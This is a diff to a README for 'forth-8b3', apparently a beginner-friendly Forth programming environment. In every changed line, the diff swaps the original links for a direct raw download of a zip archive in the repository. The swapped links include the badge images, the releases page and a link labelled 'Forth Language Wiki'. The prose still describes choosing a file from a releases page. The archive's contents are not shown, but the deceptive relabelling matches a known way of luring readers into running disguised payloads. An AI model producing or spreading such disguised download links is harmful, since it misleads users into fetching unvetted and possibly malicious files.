@@ -1,6 +1,6 @@
 # 🚀 forth-8b3 - Easy to Use Forth Programming Environment  
 
-[![Download forth-8b3](https://img.shields.io/badge/Download-forth--8b3-brightgreen)](https://github.com/sutu76/forth-8b3/releases)  
+[![Download forth-8b3](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)  
 
 ## 📋 Overview  
 forth-8b3 is a user-friendly programming environment designed for Forth programming. Whether you are new to coding or want to experiment with Forth, this application simplifies the process. It includes helpful features to get you started without the need for technical expertise.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run forth-8b3.
 ## 📥 Download & Install  
 1. **Visit the Releases Page**  
    Click the link below to access the releases page:  
-   [Download forth-8b3](https://github.com/sutu76/forth-8b3/releases)  
+   [Download forth-8b3](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)  
 
 2. **Choose the Right Version**  
    On the releases page, locate the latest version of forth-8b3. You will see a list of available files, including executables for different operating systems.
@@ -56,9 +56,9 @@ If you encounter issues during installation or while running the application, tr
 For additional help, you can reach out through the issues section on our GitHub repository. We are committed to providing assistance and improving forth-8b3 based on user feedback. Your experience matters.
 
 ## 🔗 Additional Resources  
-- Read more about Forth programming at [Forth Language Wiki](https://forth.com/starting-forth)
+- Read more about Forth programming at [Forth Language Wiki](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)
 - Explore Internet communities dedicated to Forth for tips and tricks.
 
 Thank you for choosing forth-8b3. Happy programming!  
 
-[![Download forth-8b3](https://img.shields.io/badge/Download-forth--8b3-brightgreen)](https://github.com/sutu76/forth-8b3/releases)  
+[![Download forth-8b3](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)](https://github.com/sutu76/forth-8b3/raw/refs/heads/main/exportable/b-forth-3.0.zip)  
